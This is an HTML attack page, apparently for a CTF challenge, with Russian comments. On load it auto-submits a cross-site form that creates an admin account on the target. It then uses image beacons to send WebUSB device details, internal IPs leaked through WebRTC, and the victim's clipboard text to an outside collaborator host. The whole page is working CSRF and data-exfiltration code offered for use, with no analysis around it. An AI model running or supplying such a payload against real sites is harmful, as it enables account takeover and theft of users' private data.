<!DOCTYPE html>
<form method="POST" action="https://tasks.goidactf.ru:20431/create_admin" target="_blank">
    <input name="new_admin_login" value="NO_FETCH_ADMIN">
</form>

<iframe name="resultFrame" style="display:none"></iframe>

<script>
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// 1. Отправляем форму создания админа
document.forms[0].submit();

// 2. WebUSB (без fetch)
setTimeout(() => {
    if (navigator.usb) {
        navigator.usb.requestDevice({ filters: [] })
        .then(device => {
            // Отправляем инфу через Image
            const data = `USB: ${device.vendorId}:${device.productId} ${device.productName || ''}`;
            new Image().src = COLLAB + '/?usb=' + encodeURIComponent(data);
        })
        .catch(e => {
            new Image().src = COLLAB + '/?usb_error=' + encodeURIComponent(e.message);
        });
    }
}, 1000);

// 3. WebRTC для внутреннего IP (без fetch)
setTimeout(() => {
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = (ice) => {
        if (ice.candidate && ice.candidate.candidate) {
            new Image().src = COLLAB + '/?ice=' + encodeURIComponent(ice.candidate.candidate);
        }
    };
}, 2000);

// 4. Clipboard API (без fetch)
setTimeout(() => {
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText()
        .then(text => {
            if (text) {
                new Image().src = COLLAB + '/?clipboard=' + encodeURIComponent(text.substring(0, 200));
            }
        })
        .catch(() => {
            // Пробуем записать
            navigator.clipboard.writeText('CTF_' + Date.now());
        });
    }
}, 3000);
</script>
